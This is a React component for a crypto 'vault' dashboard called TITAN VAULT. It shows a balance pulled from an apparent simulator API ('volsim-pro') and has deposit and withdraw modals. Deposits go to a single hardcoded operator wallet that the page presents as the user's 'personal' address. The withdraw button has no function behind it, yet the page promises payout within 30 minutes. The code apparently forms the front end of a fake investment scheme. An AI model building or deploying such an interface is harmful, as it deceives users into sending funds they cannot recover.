'use client';
import React, { useState, useEffect } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import { Wallet, ArrowDownCircle, ArrowUpCircle, X, Copy, CheckCircle } from 'lucide-react';

export default function TitanVault() {
  const [data, setData] = useState({ account: { equity: "19.69", profit: "0.00", vault: 0 } });
  const [modal, setModal] = useState(null); // 'deposit' or 'withdraw'
  const [copied, setCopied] = useState(false);

  // YOUR WALLET ADDRESSES
  const WALLETS = {
    BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Replace with your real BTC address
    USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" // Replace with your real TRC20 address
  };

  useEffect(() => {
    const interval = setInterval(async () => {
      try {
        const res = await fetch('https://volsim-pro.onrender.com/api/trade/status');
        setData(await res.json());
      } catch (e) { console.error("Sync Lost"); }
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-black text-white p-4 font-mono relative overflow-hidden">
      {/* BACKGROUND NEON GLOW */}
      <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_50%_50%,_rgba(0,243,255,0.05)_0%,_transparent_50%)] pointer-events-none" />

      {/* DASHBOARD HEADER */}
      <div className="flex justify-between items-center border-b border-neonBlue/20 pb-4 mb-6">
        <div className="flex items-center gap-3">
          <div className="w-3 h-3 bg-neonBlue rounded-full animate-pulse shadow-[0_0_10px_#00f3ff]" />
          <h1 className="text-xl font-bold tracking-tighter text-white">TITAN <span className="text-neonBlue">VAULT v5.8.8</span></h1>
        </div>
        <div className="text-[10px] text-gray-500">SECURE NODE: ACTIVE</div>
      </div>

      {/* MAIN GRID */}
      <div className="grid grid-cols-12 gap-6">
        {/* EQUITY & ACTIONS */}
        <div className="col-span-12 lg:col-span-4 space-y-4">
          <div className="p-6 rounded-xl bg-gray-900/40 border border-neonBlue/30 shadow-lg relative overflow-hidden">
            <div className="text-xs text-neonBlue uppercase mb-2">Total Balance</div>
            <div className="text-4xl font-black italic tracking-widest text-white">${data.account.equity}</div>
            <div className="mt-4 flex gap-2">
               <button onClick={() => setModal('deposit')} className="flex-1 bg-neonBlue text-black font-bold py-3 rounded flex items-center justify-center gap-2 hover:bg-white transition duration-300">
                 <ArrowDownCircle size={18}/> DEPOSIT
               </button>
               <button onClick={() => setModal('withdraw')} className="flex-1 bg-transparent border border-gray-700 text-gray-400 font-bold py-3 rounded flex items-center justify-center gap-2 hover:border-white hover:text-white transition">
                 <ArrowUpCircle size={18}/> WITHDRAW
               </button>
            </div>
          </div>
        </div>

        {/* CHART & ENGINE */}
        <div className="col-span-12 lg:col-span-8">
           <div className="rounded-xl border border-gray-800 h-[400px] bg-gray-900/20 overflow-hidden shadow-2xl">
              <iframe 
                src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark"
                className="w-full h-full border-none opacity-90"
              />
           </div>
        </div>
      </div>

      {/* PAYMENT MODAL (SLIDE UP) */}
      {modal && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-end lg:items-center justify-center p-4">
          <div className="w-full max-w-md bg-gray-900 border border-neonBlue/50 rounded-2xl p-6 shadow-[0_0_50px_rgba(0,243,255,0.2)] animate-in slide-in-from-bottom duration-300">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-xl font-bold text-neonBlue">{modal === 'deposit' ? 'DEPOSIT FUNDS' : 'WITHDRAW FUNDS'}</h2>
              <button onClick={() => setModal(null)} className="text-gray-500 hover:text-white"><X/></button>
            </div>

            {modal === 'deposit' ? (
              <div className="space-y-6 text-center">
                <div className="bg-white p-4 rounded-xl inline-block mx-auto shadow-[0_0_20px_#fff]">
                  <QRCodeSVG value={WALLETS.BTC} size={180} />
                </div>
                <div className="space-y-2 text-left">
                  <label className="text-[10px] text-gray-500 uppercase">Your Personal BTC Address</label>
                  <div className="flex items-center gap-2 bg-black border border-gray-800 p-3 rounded group cursor-pointer" onClick={() => copyToClipboard(WALLETS.BTC)}>
                    <code className="text-[11px] text-neonBlue break-all flex-1">{WALLETS.BTC}</code>
                    {copied ? <CheckCircle size={16} className="text-green-500"/> : <Copy size={16} className="text-gray-600 group-hover:text-white"/>}
                  </div>
                </div>
                <p className="text-[10px] text-gray-400 italic">Funds will reflect in TITAN equity after 2 network confirmations.</p>
              </div>
            ) : (
              <div className="space-y-4">
                 <p className="text-gray-400 text-sm">Withdrawal requests are processed within 30 minutes to your verified wallet.</p>
                 <input className="w-full bg-black border border-gray-800 p-4 rounded text-white focus:border-neonBlue outline-none" placeholder="Enter Amount (USD)" />
                 <input className="w-full bg-black border border-gray-800 p-4 rounded text-white focus:border-neonBlue outline-none" placeholder="Target BTC/USDT Address" />
                 <button className="w-full bg-neonPink/20 border border-neonPink text-neonPink py-4 rounded font-bold hover:bg-neonPink hover:text-white transition">PROCESS WITHDRAWAL</button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
